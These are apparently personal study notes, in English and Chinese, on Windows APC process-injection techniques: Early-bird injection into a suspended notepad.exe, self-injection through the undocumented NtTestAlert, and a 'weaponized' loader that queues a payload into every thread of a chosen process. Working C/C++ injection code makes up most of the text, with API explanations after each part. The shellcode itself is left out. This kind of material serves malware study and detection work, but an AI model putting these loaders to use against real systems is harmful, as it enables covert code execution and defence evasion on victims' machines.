
### 0x13 APC injection technique - Early-bird injection
🌟refs: https://cocomelonc.github.io/tutorial/2021/11/11/malware-injection-3.html
```c
int main() {

  // Create a 64-bit process:
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  LPVOID my_payload_mem;
  SIZE_T my_payload_len = sizeof(my_payload);
  LPCWSTR cmd;
  HANDLE hProcess, hThread;
  NTSTATUS status;

  ZeroMemory(&si, sizeof(si));
  ZeroMemory(&pi, sizeof(pi));
  si.cb = sizeof(si);

  CreateProcessA(
    "C:\\Windows\\System32\\notepad.exe",
    NULL, NULL, NULL, false,
    CREATE_SUSPENDED, NULL, NULL, &si, &pi
  ); // does not run until the ResumeThread function is called

  // allow time to start/initialize.
  WaitForSingleObject(pi.hProcess, 5000);
  hProcess = pi.hProcess;
  hThread = pi.hThread;

  // allocate a memory buffer for payload, return as a LPVOID
  my_payload_mem = VirtualAllocEx(hProcess, NULL, my_payload_len,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // write payload to allocated buffer
  WriteProcessMemory(hProcess, my_payload_mem, my_payload, my_payload_len, NULL);

  // inject into the suspended thread.
  PTHREAD_START_ROUTINE apc_r = (PTHREAD_START_ROUTINE)my_payload_mem;
  QueueUserAPC((PAPCFUNC)apc_r, hThread, NULL);

  // resume to suspended thread
  ResumeThread(hThread);

  return 0;
}
```
1. create process with `create_suspend` flag **(does not run until the `ResumeThread` function is called)** (`CreateProcessA`)
2. alloc mem buf **remotely** (`VirtualAllocEx`)
	1. this will get mem base addr
3. write to process mem (`WriteProcessMemory`)
4. resume thread with our injected APC proess (`QueueUserAPC`)
	1. payload addr as the apc pointer(`PAPCFUNC`)
	2. 把一個LPVOID丟到PAPCFUNC裡面
5. resume and APC executed (`ResumeThread`)
*tips: 把 shellcode 位址當作 APC callback 插入 suspended thread 的 APC queue, ResumeThread 後觸發 Early Bird APC injection*

> [!example]+ CreateProcess
> >🧩CreateProcess
> - 定義: create+execute process
> ```cpp
> BOOL CreateProcessA(
>   [in, optional]        LPCSTR                             lpApplicationName, (executable to be invoked)
>   [in, out, optional] LPSTR                               lpCommandLine,
>   [in, optional]        LPSECURITY_ATTRIBUTES  lpProcessAttributes,
>   [in, optional]        LPSECURITY_ATTRIBUTES  lpThreadAttributes,
>   [in]                      BOOL                                bInheritHandles,
>   [in]                      DWORD                             dwCreationFlags,(process creation flags)
>   [in, optional]        LPVOID                             lpEnvironment,
>   [in, optional]        LPCSTR                            lpCurrentDirectory,
>   [in]                     LPSTARTUPINFOA              lpStartupInfo,
>   [out]                   LPPROCESS_INFORMATION lpProcessInformation
> );
> ```
> 
> >🧩CreateProcessA, CreateProcessW
> - `A` for ANSI(old), `-W`for Unicode(new)
> - CreateProcessW can modify 2nd param


> [!example]+ APC & QueueUserAPC
>#### APC （Asynchronous Procedure Call）
>Windows thread-level's callback queue, every thread has a APC queue
>will  issues a software interrupt when queued
> - kernel APC `NtQueueApcThread`
> - UserAPC `QueueUserAPC`
>
> >🧩QueueUserAPC
> - 作用: 把一個 callback function 排入某個 thread 的 APC queue 中 (Userland)
> - `QueueUserAPC → thread`, not into process
> - `QueueUserAPC() callback → thread APC queue → (KEY)thread 進入 alertable wait → Windows dispatch APC → callback executed`

### 0x14 APC injection - NtTestAlert(undoc)
refs: https://cocomelonc.github.io/tutorial/2021/11/20/malware-injection-4.html

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)(); 
//same as typedef 

<snip>

int main(int argc, char* argv[]) {
  SIZE_T my_payload_len = sizeof(my_payload);
  
  HMODULE hNtdll = GetModuleHandleA("ntdll"); // get base addr
  myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(hNtdll, "NtTestAlert")); //call by adddress and create func prtr

  LPVOID my_payload_mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(GetCurrentProcess(), my_payload_mem, my_payload, my_payload_len, NULL);

  PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)my_payload_mem;
  QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
  
  testAlert();

  return 0;
}

```
1. 定義TestAlert為func ptr型別 (`myNtTestAlert`)
2. 從ntdll handle的base addr (`hNtdll`) 建立 pointer 指向NtTestAlert函式(`testAlert`)
3. 將shellcode寫入當前Process的buffer (`VirtualAlloc`+`WriteProcessMemoryt)
4. 把APC插入當前thread(`QueueUserAPC`)
5. testAlert executes NtTestAlert
*tips: 直接執行處發，不用像early bird等待resume，*

> [!example]+ NTtestAlert (undocumented)
> >🧩 NtTestAlert
> - 作用: 執行當前 thread 的 pending user-mode APC (強制 dispatch APC)
> - 場域: b4 thread start execute
> 


| 方法                              | 需要暫停 thread?          | 作用                          |
| ------------------------------- | --------------------- | --------------------------- |
| `QueueUserAPC` + `ResumeThread` | 通常用於 suspended thread | 在 thread resume 時觸發 APC     |
| `NtTestAlert()`                 | 不需要暫停 thread          | 立即執行當前 thread 的 pending APC |

### 0x15  APC injection - alertable threads
🌟refs: https://cocomelonc.github.io/tutorial/2021/11/22/malware-injection-5.html

Weaponizing: auto getting process and inject all

> [!tool]+ getTids  enumerate tool
> ![](https://cocomelonc.github.io/assets/images/23/2021-11-22_16-09.png)
```cpp
int main(int argc, char* argv[]) {
  DWORD pid = 0; // process ID
  HANDLE ph; // process handle
  HANDLE ht; // thread handle
  LPVOID rb; // remote buffer
  std::vector<DWORD> tids; // thread IDs

  pid = findMyProc(argv[1]);
  
  if (pid == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  } else {
    printf("PID = %d\n", pid);

    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

    if (ph == NULL) {
      printf("OpenProcess failed! exiting...\n");
      return -2;
    }

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // write payload to memory buffer
    WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);

    if (getTids(pid, tids)) {
      for (DWORD tid : tids) {
        HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
        if (ht) {
          QueueUserAPC((PAPCFUNC)rb, ht, NULL);
          printf("payload injected via QueueUserAPC\n");
          CloseHandle(ht);
        }
      }
    }
    CloseHandle(ph);
  }
  return 0;
}

```
1. 用之前的findprocess func找到目標pid (`find_process()`)
2. alloc mem + write buf (`VirtualAllowcEx`, `WriteProcessMemory`)
3. Find thread id from pid - 新工具 (`getTids()`)
	1. snapshot + enum (First -> Next) 判斷 thread 是否屬於目標 process(`pid == th32OwnerProcessID`)
	2. 所有符合的 thread 都 push 進 tids vector
4. 對目標Process找到的每一個thread都 Queue APC with ptr to payload
	1. 因為Process有多個thread 所以直接全部注入

> [!bug]+ 測試
> poc 在 win7 似乎會有些問題

